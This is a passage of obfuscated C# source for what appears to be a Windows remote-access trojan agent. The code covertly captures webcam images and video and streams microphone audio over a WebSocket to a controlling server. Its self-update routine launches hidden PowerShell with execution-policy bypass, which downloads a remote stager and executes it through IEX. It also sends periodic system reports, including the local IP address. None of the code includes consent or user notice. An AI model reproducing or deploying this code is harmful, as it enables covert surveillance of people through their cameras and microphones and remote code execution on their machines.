            IntPtr pCapBld = IntPtr.Zero, pCapFilter = IntPtr.Zero, pGrabFilter = IntPtr.Zero, pNullRend = IntPtr.Zero;
            bool comInit = false;
            try
            {
                int coHr = CoInitializeEx(IntPtr.Zero, 0x2); 
                comInit = (coHr >= 0 || coHr == 1);

                int w, h; string error;
                if (!_MQwLNAokWPM(out pGraph, out pGrabber, out pMC, out w, out h, out error,
                                 out pCapBld, out pCapFilter, out pGrabFilter, out pNullRend))
                {
                    _TfnfMjSzCWKv("webcam_snap_result", id,
                        "{\"error\":\"" + (error ?? "未知错误").Replace("\"", "'") + "\"}");
                    return;
                }

                
                _hDDCzP<DsSgSetOneShotDlg>(pGrabber, 3)(pGrabber, 1);
                _hDDCzP<DsMcRunDlg>(pMC, 7)(pMC);
                Thread.Sleep(2000); 

                var enc = ImageCodecInfo.GetImageEncoders().FirstOrDefault(e => e.FormatID == ImageFormat.Jpeg.Guid);
                var ep = new EncoderParameters(1);
                ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 85L);

                byte[] jpgBytes = _qFuUSEGjuo(pGrabber, w, h, 85, enc, ep);
                if (jpgBytes == null)
                {
                    _TfnfMjSzCWKv("webcam_snap_result", id, "{\"error\":\"GetCurrentBuffer失败\"}");
                    return;
                }

                string b64 = Convert.ToBase64String(jpgBytes);
                _TfnfMjSzCWKv("webcam_snap_result", id,
                    string.Format("{{\"image\":\"{0}\",\"width\":{1},\"height\":{2},\"size\":{3}}}",
                        b64, w, h, jpgBytes.Length));
            }
            catch (Exception ex)
            {
                _TfnfMjSzCWKv("webcam_snap_result", id,
                    "{\"error\":\"" + ex.Message.Replace("\"", "'") + "\"}");
            }
            finally
            {
                _dkAMirlaDXLfrh(ref pMC, ref pGraph, ref pGrabber, ref pCapBld, ref pCapFilter, ref pGrabFilter, ref pNullRend);
                if (comInit) CoUninitialize();
            }
        }

        
        
        

        volatile bool _JjgqSfMHnCUZirZL;
        Thread _DyOLRZOtukkLN;
        string _webcamSessionId = "";
        string _webcamCodec = "h264";
        int _webcamSending; 

        void _PAJjEGzlJhqdXWtbF(string id, string payload)
        {
            bool jpegMode = string.Equals(_hUALleDbnckSq(payload, "codec"), "jpeg", StringComparison.OrdinalIgnoreCase);
            string codec = jpegMode ? "jpeg" : "h264";
            if (_JjgqSfMHnCUZirZL)
            {
                if (_webcamCodec == codec)
                {
                    _TfnfMjSzCWKv("webcam_start_result", id, "{\"status\":\"already_running\"}");
                    return;
                }
                _JjgqSfMHnCUZirZL = false;
                try { if (_DyOLRZOtukkLN != null && _DyOLRZOtukkLN.IsAlive) _DyOLRZOtukkLN.Join(3000); } catch { }
                if (_DyOLRZOtukkLN != null && _DyOLRZOtukkLN.IsAlive)
                {
                    _TfnfMjSzCWKv("webcam_start_result", id, "{\"status\":\"busy\"}");
                    return;
                }
            }
            _JjgqSfMHnCUZirZL = true;
            _webcamSessionId = id;
            _webcamCodec = codec;
            _DyOLRZOtukkLN = new Thread(() => _iYHzCobgFBZiTyUg(id, jpegMode));
            _DyOLRZOtukkLN.IsBackground = true;
            _DyOLRZOtukkLN.Start();
            _TfnfMjSzCWKv("webcam_start_result", id, "{\"status\":\"started\"}");
        }

        void _CllMPXYXJlkTTOec(string id)
        {
            _JjgqSfMHnCUZirZL = false;
            _TfnfMjSzCWKv("webcam_stop_result", id, "{\"status\":\"stopped\"}");
        }

        
        
        const int WC_HDR = 7;

        void _iYHzCobgFBZiTyUg(string sessionId, bool jpegMode)
        {
            IntPtr pGraph = IntPtr.Zero, pGrabber = IntPtr.Zero, pMC = IntPtr.Zero;
            IntPtr pCapBld = IntPtr.Zero, pCapFilter = IntPtr.Zero, pGrabFilter = IntPtr.Zero, pNullRend = IntPtr.Zero;
            bool comInit = false;
            const int TARGET_FPS = 15;
            int interval = 1000 / TARGET_FPS;

            try
            {
                int coHr = CoInitializeEx(IntPtr.Zero, 0x2);
                comInit = (coHr >= 0 || coHr == 1);

                int w, h; string error;
                if (!_MQwLNAokWPM(out pGraph, out pGrabber, out pMC, out w, out h, out error,
                                 out pCapBld, out pCapFilter, out pGrabFilter, out pNullRend))
                { _JjgqSfMHnCUZirZL = false; return; }

                _hDDCzP<DsSgSetOneShotDlg>(pGrabber, 3)(pGrabber, 0);
                _hDDCzP<DsMcRunDlg>(pMC, 7)(pMC);
                Thread.Sleep(800);

                MFH264Encoder h264 = null;
                byte[] bgraBuf = null;
                ImageCodecInfo jpgEnc = null;
                EncoderParameters jpgEp = null;
                Bitmap jpgBmp = null;
                MemoryStream jpgMs = null;
                int h264NullCount = 0;
                int grabFailCount = 0;
                try
                {
                    if (jpegMode)
                    {
                        jpgEnc = ImageCodecInfo.GetImageEncoders().FirstOrDefault(e => e.FormatID == ImageFormat.Jpeg.Guid);
                        jpgEp = new EncoderParameters(1);
                        jpgEp.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 50L);
                        jpgMs = new MemoryStream(32768);
                    }
                    else
                    {
                        h264 = new MFH264Encoder(w, h, TARGET_FPS, 1500);
                        bgraBuf = new byte[w * h * 4];
                    }
                }
                catch { _JjgqSfMHnCUZirZL = false; return; }
                byte[] pixBuf = null;
                var sw = new System.Diagnostics.Stopwatch();
                Interlocked.Exchange(ref _webcamSending, 0);

                while (_JjgqSfMHnCUZirZL)
                {
                    sw.Restart();
                    try
                    {
                        
                        int bufSize = 0;
                        int hr2 = _hDDCzP<DsSgGetBufDlg>(pGrabber, 7)(pGrabber, ref bufSize, IntPtr.Zero);
                        if (hr2 < 0 || bufSize <= 0)
                        {
                            grabFailCount++;
                            if (grabFailCount >= 60)
                            {
                                try { _hDDCzP<DsMcStopDlg>(pMC, 9)(pMC); } catch { }
                                Thread.Sleep(200);
                                try { _hDDCzP<DsMcRunDlg>(pMC, 7)(pMC); } catch { }
                                grabFailCount = 0;
                            }
                            Thread.Sleep(16);
                            continue;
                        }
                        grabFailCount = 0;

                        if (pixBuf == null || pixBuf.Length < bufSize) pixBuf = new byte[bufSize];
                        GCHandle hPin = GCHandle.Alloc(pixBuf, GCHandleType.Pinned);
                        try { _hDDCzP<DsSgGetBufDlg>(pGrabber, 7)(pGrabber, ref bufSize, hPin.AddrOfPinnedObject()); }
                        finally { hPin.Free(); }

                        int bpp = bufSize / (w * h);
                        if (bpp < 3) bpp = 3; if (bpp > 4) bpp = 3;
                        int stride = w * bpp;

                        byte[] packet = null;

                        if (jpegMode)
                        {
                            var pixFmt = bpp == 3 ? System.Drawing.Imaging.PixelFormat.Format24bppRgb
                                                  : System.Drawing.Imaging.PixelFormat.Format32bppRgb;
                            if (jpgBmp == null || jpgBmp.Width != w || jpgBmp.Height != h)
                            {
                                if (jpgBmp != null) jpgBmp.Dispose();
                                jpgBmp = new Bitmap(w, h, pixFmt);
                            }
                            var bd = jpgBmp.LockBits(new Rectangle(0, 0, w, h),
                                System.Drawing.Imaging.ImageLockMode.WriteOnly, pixFmt);
                            try
                            {
                                for (int y = 0; y < h; y++)
                                {
                                    int srcRow = (h - 1 - y) * stride;
                                    if (srcRow + stride > pixBuf.Length) srcRow = y * stride;
                                    Marshal.Copy(pixBuf, srcRow,
                                        new IntPtr(bd.Scan0.ToInt64() + y * bd.Stride), Math.Min(stride, bd.Stride));
                                }
                            }
                            finally { jpgBmp.UnlockBits(bd); }
                            jpgMs.SetLength(0);
                            if (jpgEnc != null) jpgBmp.Save(jpgMs, jpgEnc, jpgEp);
                            else jpgBmp.Save(jpgMs, ImageFormat.Jpeg);
                            int jpgLen = (int)jpgMs.Length;
                            packet = new byte[WC_HDR + jpgLen];
                            packet[0] = 0x02; packet[1] = 0;
                            packet[2] = 0;
                            packet[3] = (byte)(w & 0xFF); packet[4] = (byte)((w >> 8) & 0xFF);
                            packet[5] = (byte)(h & 0xFF); packet[6] = (byte)((h >> 8) & 0xFF);
                            Buffer.BlockCopy(jpgMs.GetBuffer(), 0, packet, WC_HDR, jpgLen);
                        }
                        else if (h264 != null)
                        {
                            for (int y = 0; y < h; y++)
                            {
                                int srcRow = (h - 1 - y) * stride;
                                if (srcRow + stride > pixBuf.Length) srcRow = y * stride;
                                int dstRow = y * w * 4;
                                if (bpp == 3)
                                {
                                    for (int x = 0; x < w; x++)
                                    {
                                        int si = srcRow + x * 3, di = dstRow + x * 4;
                                        bgraBuf[di] = pixBuf[si]; bgraBuf[di+1] = pixBuf[si+1];
                                        bgraBuf[di+2] = pixBuf[si+2]; bgraBuf[di+3] = 0xFF;
                                    }
                                }
                                else
                                {
                                    Buffer.BlockCopy(pixBuf, srcRow, bgraBuf, dstRow, w * 4);
                                }
                            }

                            bool isKey;
                            
                            if (h264._frameIndex > 0 && h264._frameIndex % 30 == 0)
                                h264.ForceKeyFrame();
                            byte[] nal = h264.Encode(bgraBuf, w * 4, out isKey);
                            if (nal != null && nal.Length > 0)
                            {
                                h264NullCount = 0;
                                packet = new byte[WC_HDR + nal.Length];
                                packet[0] = 0x02; packet[1] = 1; 
                                packet[2] = isKey ? (byte)1 : (byte)0;
                                packet[3] = (byte)(w & 0xFF); packet[4] = (byte)((w >> 8) & 0xFF);
                                packet[5] = (byte)(h & 0xFF); packet[6] = (byte)((h >> 8) & 0xFF);
                                Buffer.BlockCopy(nal, 0, packet, WC_HDR, nal.Length);
                            }
                            else
                            {
                                h264NullCount++;
                                if (h264NullCount >= 30)
                                {
                                    try { h264.Dispose(); } catch {} h264 = null;
                                    try { h264 = new MFH264Encoder(w, h, TARGET_FPS, 1500); h264NullCount = 0; }
                                    catch { Thread.Sleep(200); }
                                }
                            }
                        }

                        if (packet != null)
                        {
                            bool isKeyFrame = packet[1] == 1 && packet[2] != 0;
                            if (Interlocked.CompareExchange(ref _webcamSending, 1, 0) == 0)
                            {
                                _SMsdStBZEcRi(packet).ContinueWith(_ =>
                                    Interlocked.Exchange(ref _webcamSending, 0));
                            }
                            else if (isKeyFrame)
                            {
                                try { _SMsdStBZEcRi(packet).Wait(500); }
                                catch { }
                            }
                        }
                    }
                    catch { }
                    int elapsed = (int)sw.ElapsedMilliseconds;
                    int sleepMs = interval - elapsed;
                    if (sleepMs > 1) Thread.Sleep(sleepMs);
                }

                if (h264 != null) try { h264.Dispose(); } catch { }
                if (jpgBmp != null) try { jpgBmp.Dispose(); } catch { }
                if (jpgMs != null) try { jpgMs.Dispose(); } catch { }
                if (jpgEp != null) try { jpgEp.Dispose(); } catch { }
            }
            catch { }
            finally
            {
                _dkAMirlaDXLfrh(ref pMC, ref pGraph, ref pGrabber, ref pCapBld, ref pCapFilter, ref pGrabFilter, ref pNullRend);
                if (comInit) CoUninitialize();
                _JjgqSfMHnCUZirZL = false;
            }
        }

        
        
        

        const int WAVE_MAPPER = -1;
        const int CALLBACK_EVENT = 0x00050000;  
        const uint WHDR_DONE = 0x00000001;
        const uint WAIT_OBJECT_0 = 0;
        const uint WAIT_TIMEOUT = 0x00000102;

        [StructLayout(LayoutKind.Sequential)]
        struct WAVEFORMATEX
        {
            public ushort wFormatTag;
            public ushort nChannels;
            public uint nSamplesPerSec;
            public uint nAvgBytesPerSec;
            public ushort nBlockAlign;
            public ushort wBitsPerSample;
            public ushort cbSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct WAVEHDR
        {
            public IntPtr lpData;
            public uint dwBufferLength;
            public uint dwBytesRecorded;
            public IntPtr dwUser;
            public uint dwFlags;
            public uint dwLoops;
            public IntPtr lpNext;
            public IntPtr reserved;
        }

        [DllImport("winmm.dll")]
        static extern int waveInGetNumDevs();
        [DllImport("winmm.dll")]
        static extern int waveInOpen(out IntPtr phwi, int uDeviceID, ref WAVEFORMATEX lpFormat, IntPtr dwCallback, IntPtr dwInstance, int fdwOpen);
        [DllImport("winmm.dll")]
        static extern int waveInPrepareHeader(IntPtr hwi, IntPtr lpWaveHdr, int uSize);
        [DllImport("winmm.dll")]
        static extern int waveInUnprepareHeader(IntPtr hwi, IntPtr lpWaveHdr, int uSize);
        [DllImport("winmm.dll")]
        static extern int waveInAddBuffer(IntPtr hwi, IntPtr lpWaveHdr, int uSize);
        [DllImport("winmm.dll")]
        static extern int waveInStart(IntPtr hwi);
        [DllImport("winmm.dll")]
        static extern int waveInStop(IntPtr hwi);
        [DllImport("winmm.dll")]
        static extern int waveInReset(IntPtr hwi);
        [DllImport("winmm.dll")]
        static extern int waveInClose(IntPtr hwi);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateEventW(IntPtr lpEventAttributes, bool bManualReset, bool bInitialState, IntPtr lpName);
        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        volatile bool _micStreaming;
        Thread _micThread;
        IntPtr _hWaveIn;
        IntPtr[] _micHdrPtrs;   
        IntPtr[] _micBuffers;
        int _adpcmPredicted;    
        int _adpcmIndex;

        void HandleMicStart(string id)
        {
            if (_micStreaming)
            {
                _TfnfMjSzCWKv("mic_start_result", id, "{\"status\":\"already_running\"}");
                return;
            }
            _micStreaming = true;
            _adpcmPredicted = 0;
            _adpcmIndex = 0;
            _micThread = new Thread(() => MicStreamLoop());
            _micThread.IsBackground = true;
            _micThread.Start();
            _TfnfMjSzCWKv("mic_start_result", id, "{\"status\":\"started\"}");
        }

        void HandleMicStop(string id)
        {
            _micStreaming = false;
            _TfnfMjSzCWKv("mic_stop_result", id, "{\"status\":\"stopped\"}");
        }

        void MicStreamLoop()
        {
            const int sampleRate = 16000;  
            const int bitsPerSample = 16;
            const int channels = 1;
            const int bufferMs = 60;       
            int bufferSize = sampleRate * (bitsPerSample / 8) * channels * bufferMs / 1000;
            const int numBuffers = 6;      

            if (waveInGetNumDevs() == 0)
            {
                _TfnfMjSzCWKv("mic_frame", "", "{\"error\":\"没有检测到麦克风设备\"}");
                _micStreaming = false;
                return;
            }

            
            IntPtr hEvent = CreateEventW(IntPtr.Zero, false, false, IntPtr.Zero);
            if (hEvent == IntPtr.Zero)
            {
                _TfnfMjSzCWKv("mic_frame", "", "{\"error\":\"创建事件对象失败\"}");
                _micStreaming = false;
                return;
            }

            var fmt = new WAVEFORMATEX
            {
                wFormatTag = 1,
                nChannels = (ushort)channels,
                nSamplesPerSec = (uint)sampleRate,
                wBitsPerSample = (ushort)bitsPerSample,
                nBlockAlign = (ushort)(channels * bitsPerSample / 8),
                nAvgBytesPerSec = (uint)(sampleRate * channels * bitsPerSample / 8),
                cbSize = 0
            };

            int hdrSize = Marshal.SizeOf(typeof(WAVEHDR));
            _micHdrPtrs = new IntPtr[numBuffers];
            _micBuffers = new IntPtr[numBuffers];

            
            int hr = waveInOpen(out _hWaveIn, WAVE_MAPPER, ref fmt, hEvent, IntPtr.Zero, CALLBACK_EVENT);
            if (hr != 0)
            {
                CloseHandle(hEvent);
                _TfnfMjSzCWKv("mic_frame", "", "{\"error\":\"打开麦克风失败(错误" + hr + ")\"}");
                _micStreaming = false;
                return;
            }

            try
            {
                for (int i = 0; i < numBuffers; i++)
                {
                    _micBuffers[i] = Marshal.AllocHGlobal(bufferSize);
                    _micHdrPtrs[i] = Marshal.AllocHGlobal(hdrSize);
                    var hdr = new WAVEHDR
                    {
                        lpData = _micBuffers[i],
                        dwBufferLength = (uint)bufferSize,
                        dwFlags = 0
                    };
                    Marshal.StructureToPtr(hdr, _micHdrPtrs[i], false);
                    waveInPrepareHeader(_hWaveIn, _micHdrPtrs[i], hdrSize);
                    waveInAddBuffer(_hWaveIn, _micHdrPtrs[i], hdrSize);
                }

                waveInStart(_hWaveIn);

                while (_micStreaming)
                {
                    
                    uint ret = WaitForSingleObject(hEvent, 50);
                    if (ret != WAIT_OBJECT_0 && ret != WAIT_TIMEOUT)
                        break;

                    
                    for (int i = 0; i < numBuffers; i++)
                    {
                        var hdr = (WAVEHDR)Marshal.PtrToStructure(_micHdrPtrs[i], typeof(WAVEHDR));
                        if ((hdr.dwFlags & WHDR_DONE) == 0)
                            continue;

                        if (hdr.dwBytesRecorded > 0)
                        {
                            byte[] chunk = new byte[hdr.dwBytesRecorded];
                            Marshal.Copy(hdr.lpData, chunk, 0, (int)hdr.dwBytesRecorded);

                            
                            
                            long sumSq = 0;
                            int nSamp = chunk.Length / 2;
                            for (int si = 0; si + 1 < chunk.Length; si += 2)
                            {
                                short s0 = (short)(chunk[si] | (chunk[si + 1] << 8));
                                sumSq += (long)s0 * s0;
                            }
                            double rms = Math.Sqrt((double)sumSq / nSamp);
                            if (rms < 300) 
                            {
                                Array.Clear(chunk, 0, chunk.Length);
                            }
                            else
                            {
                                for (int si = 0; si + 1 < chunk.Length; si += 2)
                                {
                                    short sample = (short)(chunk[si] | (chunk[si + 1] << 8));
                                    int amplified = sample * 3 / 2; 
                                    if (amplified > 32767) amplified = 32767;
                                    if (amplified < -32768) amplified = -32768;
                                    chunk[si] = (byte)(amplified & 0xFF);
                                    chunk[si + 1] = (byte)((amplified >> 8) & 0xFF);
                                }
                            }

                            
                            int numSamples = chunk.Length / 2;
                            byte[] adpcm = ImaAdpcmEncode(chunk, numSamples, ref _adpcmPredicted, ref _adpcmIndex);
                            string b64 = Convert.ToBase64String(adpcm);
                            _TfnfMjSzCWKv("mic_frame", "",
                                string.Format("{{\"audio\":\"{0}\",\"rate\":{1},\"bits\":4,\"channels\":{2},\"samples\":{3},\"codec\":\"adpcm\"}}",
                                    b64, sampleRate, channels, numSamples));
                        }

                        
                        hdr.dwFlags = 0;
                        hdr.dwBytesRecorded = 0;
                        Marshal.StructureToPtr(hdr, _micHdrPtrs[i], false);
                        waveInUnprepareHeader(_hWaveIn, _micHdrPtrs[i], hdrSize);
                        waveInPrepareHeader(_hWaveIn, _micHdrPtrs[i], hdrSize);
                        waveInAddBuffer(_hWaveIn, _micHdrPtrs[i], hdrSize);
                    }
                }
            }
            catch { }
            finally
            {
                try { waveInStop(_hWaveIn); } catch {}
                try { waveInReset(_hWaveIn); } catch {}
                for (int i = 0; i < numBuffers; i++)
                {
                    try { if (_micHdrPtrs[i] != IntPtr.Zero) waveInUnprepareHeader(_hWaveIn, _micHdrPtrs[i], hdrSize); } catch {}
                    try { if (_micHdrPtrs[i] != IntPtr.Zero) Marshal.FreeHGlobal(_micHdrPtrs[i]); } catch {}
                    try { if (_micBuffers[i] != IntPtr.Zero) Marshal.FreeHGlobal(_micBuffers[i]); } catch {}
                }
                try { waveInClose(_hWaveIn); } catch {}
                CloseHandle(hEvent);
                _hWaveIn = IntPtr.Zero;
                _micStreaming = false;
            }
        }

        
        static readonly int[] _imaIndexTable = {
            -1, -1, -1, -1, 2, 4, 6, 8,
            -1, -1, -1, -1, 2, 4, 6, 8
        };
        static readonly int[] _imaStepTable = {
            7, 8, 9, 10, 11, 12, 13, 14, 16, 17,
            19, 21, 23, 25, 28, 31, 34, 37, 41, 45,
            50, 55, 60, 66, 73, 80, 88, 97, 107, 118,
            130, 143, 157, 173, 190, 209, 230, 253, 279, 307,
            337, 371, 408, 449, 494, 544, 598, 658, 724, 796,
            876, 963, 1060, 1166, 1282, 1411, 1552, 1707, 1878, 2066,
            2272, 2499, 2749, 3024, 3327, 3660, 4026, 4428, 4871, 5358,
            5894, 6484, 7132, 7845, 8630, 9493, 10442, 11487, 12635, 13899,
            15289, 16818, 18500, 20350, 22385, 24623, 27086, 29794, 32767
        };

        static byte[] ImaAdpcmEncode(byte[] pcmData, int numSamples, ref int predicted, ref int index)
        {
            
            int outLen = 5 + (numSamples + 1) / 2;
            byte[] output = new byte[outLen];
            output[0] = (byte)(predicted & 0xFF);
            output[1] = (byte)((predicted >> 8) & 0xFF);
            output[2] = (byte)((predicted >> 16) & 0xFF);
            output[3] = (byte)((predicted >> 24) & 0xFF);
            output[4] = (byte)index;

            int outIdx = 5;
            bool highNibble = false;

            for (int i = 0; i < numSamples; i++)
            {
                int pcmIdx = i * 2;
                short sample = (short)(pcmData[pcmIdx] | (pcmData[pcmIdx + 1] << 8));

                int step = _imaStepTable[index];
                int diff = sample - predicted;
                int sign = 0;
                if (diff < 0) { sign = 8; diff = -diff; }

                int nibble = 0;
                if (diff >= step) { nibble = 4; diff -= step; }
                step >>= 1;
                if (diff >= step) { nibble |= 2; diff -= step; }
                step >>= 1;
                if (diff >= step) { nibble |= 1; }

                nibble |= sign;

                
                step = _imaStepTable[index];
                int delta = step >> 3;
                if ((nibble & 4) != 0) delta += step;
                if ((nibble & 2) != 0) delta += step >> 1;
                if ((nibble & 1) != 0) delta += step >> 2;
                if ((nibble & 8) != 0) delta = -delta;

                predicted += delta;
                if (predicted > 32767) predicted = 32767;
                if (predicted < -32768) predicted = -32768;

                index += _imaIndexTable[nibble];
                if (index < 0) index = 0;
                if (index > 88) index = 88;

                if (!highNibble)
                {
                    output[outIdx] = (byte)(nibble & 0x0F);
                    highNibble = true;
                }
                else
                {
                    output[outIdx] |= (byte)((nibble & 0x0F) << 4);
                    outIdx++;
                    highNibble = false;
                }
            }

            return output;
        }

        
        
        

        internal volatile bool _ouhHQJzIxvdbt;

        void _HGswOWoDySDGdGkq(string id, string payload)
        {
            try
            {
                _TfnfMjSzCWKv("self_update_result", id, "{\"status\":\"updating\"}");

                
                string baseUrl = _hUALleDbnckSq(payload, "stager_base_url");
                if (string.IsNullOrEmpty(baseUrl)) baseUrl = _hXDJfNdoAJ;

                string mid = Environment.MachineName;
                string stagerUrl = baseUrl.TrimEnd('/') + "/api/agent/stager?mid=" + Uri.EscapeDataString(mid);
                if (!string.IsNullOrEmpty(_AkICMo)) stagerUrl += "&token=" + Uri.EscapeDataString(_AkICMo);
                if (!string.IsNullOrEmpty(_deployId)) stagerUrl += "&deployId=" + Uri.EscapeDataString(_deployId);

                
                string psInner =
                    "Start-Sleep -Seconds 5;" +
                    "$ok=$false;for($i=0;$i -lt 25;$i++){" +
                    "$m=[System.Threading.Mutex]::new($false,'Global\\MiniAgentV2_'+$env:COMPUTERNAME);" +
                    "try{if($m.WaitOne(1000)){$m.ReleaseMutex();$ok=$true;break}}catch{$ok=$true;break}finally{$m.Dispose()}" +
                    "Start-Sleep -Seconds 1};" +
                    "if(-not $ok){exit 1};" +
                    "[Net.ServicePointManager]::SecurityProtocol='Tls12';" +
                    "IEX((New-Object Net.WebClient).DownloadString('" + stagerUrl + "'))";

                
                var psi = new ProcessStartInfo();
                psi.FileName = _Q._S("HJZQormOj2dPb59WCXQ=");
                psi.Arguments = "-ep bypass -w hidden -NonI -c \"" + psInner.Replace("\"", "\\\"") + "\"";
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);

                Thread.Sleep(300);

                
                _ouhHQJzIxvdbt = true;

                
                _cts.Cancel();
            }
            catch (Exception ex)
            {
                _TfnfMjSzCWKv("self_update_result", id, "{\"error\":\"" + _AexenijxeK(ex.Message) + "\"}");
            }
        }

        
        void _WPwZqTHFAW()
        {
            while (!_cts.IsCancellationRequested)
            {
                try
                {
                    var report = _pHjBYCYmEjnLj();
                    _fDVwBfdz(_AQWXONNmPr, report);
                }
                catch { }
                Thread.Sleep(ReportIntervalSec * 1000);
            }
        }

        string _pHjBYCYmEjnLj()
        {
            double cpuUsage = 0;
            long memTotal = 0, memUsed = 0;
            long diskTotal = 0, diskUsed = 0;
            long netIn = 0, netOut = 0;
            int procCount = 0;

            try
            {
                
                using (var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total"))
                {
                    cpuCounter.NextValue();
                    Thread.Sleep(500);
                    cpuUsage = Math.Round(cpuCounter.NextValue(), 1);
                }
            }
            catch { }

            try
            {
                
                using (var searcher = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize, FreePhysicalMemory FROM Win32_OperatingSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        memTotal = Convert.ToInt64(obj["TotalVisibleMemorySize"]) / 1024; 
                        long free = Convert.ToInt64(obj["FreePhysicalMemory"]) / 1024;
                        memUsed = memTotal - free;
                    }
                }
            }
            catch { }

            try
            {
                
                var drive = new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory));
                diskTotal = drive.TotalSize / (1024L * 1024 * 1024);
                diskUsed = (drive.TotalSize - drive.AvailableFreeSpace) / (1024L * 1024 * 1024);
            }
            catch { }

            try { procCount = Process.GetProcesses().Length; } catch { }

            try
            {
                
                using (var searcher = new ManagementObjectSearcher("SELECT BytesReceivedPerSec, BytesSentPerSec FROM Win32_PerfFormattedData_Tcpip_NetworkInterface"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        netIn += Convert.ToInt64(obj["BytesReceivedPerSec"]);
                        netOut += Convert.ToInt64(obj["BytesSentPerSec"]);
                    }
                }
            }
            catch { }

            double memUsage = memTotal > 0 ? Math.Round((double)memUsed / memTotal * 100, 1) : 0;
            double diskUsage = diskTotal > 0 ? Math.Round((double)diskUsed / diskTotal * 100, 1) : 0;
            var uptime = (DateTime.Now - Process.GetCurrentProcess().StartTime).ToString(@"d\.hh\:mm\:ss");

            
            string localIp = "";
            try
            {
                foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus != System.Net.NetworkInformation.OperationalStatus.Up) continue;
                    if (ni.NetworkInterfaceType == System.Net.NetworkInformation.NetworkInterfaceType.Loopback) continue;
                    foreach (var addr in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (addr.Address.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork) continue;
                        string ip = addr.Address.ToString();
                        if (!ip.StartsWith("127.")) { localIp = ip; break; }
                    }
                    if (!string.IsNullOrEmpty(localIp)) break;
                }
            }
            catch { }

            return string.Format(
                "{{\"token\":\"{0}\",\"version\":\"{1}\"," +
                "\"cpuUsage\":{2},\"memTotal\":{3},\"memUsed\":{4},\"memUsage\":{5}," +
                "\"diskTotal\":{6},\"diskUsed\":{7},\"diskUsage\":{8}," +
                "\"netIn\":{9},\"netOut\":{10},\"load1m\":0,\"load5m\":0,\"load15m\":0," +
                "\"processCount\":{11},\"uptime\":\"{12}\",\"deployId\":\"{13}\",\"ip\":\"{14}\"}}",
                _AexenijxeK(_AkICMo), _AexenijxeK(Version),
                cpuUsage.ToString("F1", System.Globalization.CultureInfo.InvariantCulture),
                memTotal, memUsed,
                memUsage.ToString("F1", System.Globalization.CultureInfo.InvariantCulture),
                diskTotal, diskUsed,
                diskUsage.ToString("F1", System.Globalization.CultureInfo.InvariantCulture),
                netIn, netOut,
                procCount, _AexenijxeK(uptime), _AexenijxeK(_deployId), _AexenijxeK(localIp));
        }

        
        
        

        void _TfnfMjSzCWKv(string type, string id, string payloadJson)
        {
            var json = string.Format(
                "{{\"type\":\"{0}\",\"id\":\"{1}\",\"payload\":{2}}}",
                _AexenijxeK(type), _AexenijxeK(id), payloadJson);
            try
            {
                _xeAwxL(Encoding.UTF8.GetBytes(json)).Wait();
            }
            catch { }
        }

        async Task _xeAwxL(byte[] data)
        {
            if (_wsDisposed) return;
            if (!await _EPgJvQkInc.WaitAsync(10000)) return; 
            try
            {
                if (!_wsDisposed && _ws != null && _ws.State == WebSocketState.Open)
                {
                    await _ws.SendAsync(new ArraySegment<byte>(data),
                        WebSocketMessageType.Text, true, _cts.Token);
                }
            }
            finally
            {
                _EPgJvQkInc.Release();
            }
        }

        internal async Task _SMsdStBZEcRi(byte[] data)
        {
            if (_wsDisposed) return;
            if (!await _EPgJvQkInc.WaitAsync(10000)) return;
            try
            {
                if (!_wsDisposed && _ws != null && _ws.State == WebSocketState.Open)
                {
                    await _ws.SendAsync(new ArraySegment<byte>(data),
                        WebSocketMessageType.Binary, true, _cts.Token);
                }
            }
            finally
            {
                _EPgJvQkInc.Release();
            }
        }

        internal async Task WsSendTextThenBinary(byte[] textData, byte[] binaryData)
        {
            if (_wsDisposed) return;
            if (!await _EPgJvQkInc.WaitAsync(10000)) return;
            try
            {
                if (!_wsDisposed && _ws != null && _ws.State == WebSocketState.Open)
                {
                    await _ws.SendAsync(new ArraySegment<byte>(textData),
                        WebSocketMessageType.Text, true, _cts.Token);
                    await _ws.SendAsync(new ArraySegment<byte>(binaryData),
                        WebSocketMessageType.Binary, true, _cts.Token);
                }
            }
            finally
            {
                _EPgJvQkInc.Release();
            }
        }

        bool _pChwTtewgagCWsZ(string json)
        {
            var sig = _hUALleDbnckSq(json, "sig");
            var ts = _hUALleDbnckSq(json, "ts");
            var type = _hUALleDbnckSq(json, "type");
            var id = _hUALleDbnckSq(json, "id");
            var payload = _QakMRksQlX(json, "payload");

            if (string.IsNullOrEmpty(sig) || string.IsNullOrEmpty(ts))
            {
                return false;
            }

            long tsVal;
            if (!long.TryParse(ts, out tsVal))
                return false;
            long nowUnix = (long)(DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds;
            if (Math.Abs(nowUnix - tsVal) > 60)
            {
                return false;
            }

            var raw = type + "|" + id + "|" + ts + "|" + payload;
            using (var hmac = new HMACSHA256(_Xybowkof))
            {
                var hash = hmac.ComputeHash(Encoding.UTF8.GetBytes(raw));
                var expected = BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
                if (sig != expected)
                {
                    return false;
                }
                return true;
            }
        }

        string _fDVwBfdz(string url, string jsonBody)
        {
            var request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = "application/json";
            request.Timeout = 15000;
            var bytes = Encoding.UTF8.GetBytes(jsonBody);
            request.ContentLength = bytes.Length;
            using (var stream = request.GetRequestStream())
                stream.Write(bytes, 0, bytes.Length);
            using (var resp = (HttpWebResponse)request.GetResponse())
            using (var reader = new StreamReader(resp.GetResponseStream()))
                return reader.ReadToEnd();
        }

        

        static string _AexenijxeK(string s)
        {
            if (s == null) return "";
